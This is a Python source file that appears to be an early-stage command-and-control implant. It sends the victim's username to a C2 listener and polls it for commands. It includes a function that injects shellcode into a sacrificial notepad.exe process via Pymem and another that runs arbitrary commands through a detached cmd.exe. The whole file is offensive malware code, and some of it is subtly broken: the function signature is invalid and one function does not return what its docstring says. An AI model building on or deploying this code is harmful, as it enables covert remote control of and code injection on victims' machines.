'''
TODO:
Send a GET to the C2 at random time intervals.
Parse the C2 command to one of the functions
'''

import requests
import subprocess
import time
from pymem import Pymem
from subprocess import PIPE

# Get our name
who = subprocess.Popen('whoami', stdout=subprocess.PIPE)
who = who.stdout.read()

# Structure our name
headers = {'X-Transact': 'Action', 'Hello' : str(who), 'ID' : '1'}
data = {'ID' : '1'}

# Send our name
r = requests.post('http://localhost:8443', headers=headers, data=data)
time.sleep(20)
print('Sending GET')
a = requests.get('http://localhost:8443', headers=headers)
print(a.headers)

def sacrificial_process(process_name='notepad.exe', shellcode):
  '''
  This takes in a process name (optional) and our shellcode to inject
  Returns nothing
  '''
  notepad = subprocess.Popen([process_name]) # If no process provided, start sacrificial process

  pm = Pymem(process_name) # get a handle on a running process 
  pm.inject_python_interpreter()
  pm.inject_python_shellcode(shellcode)
  notepad.kill() # Kill sacrificial process
  
def cmdexe(beacon_command): 
    '''
    This takes in a string to execute
    Returns the output if any available
    '''
    DETACHED_PROCESS=0x00000008 # For console processes, the new process does not inherit its parent's console
    # https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags?redirectedfrom=MSDN 
    results=subprocess.Popen(['cmd.exe', '/C', beacon_command], close_fds=True, creationflags = DETACHED_PROCESS, stdout=PIPE)
    output = results.stdout.read()
    print (output)
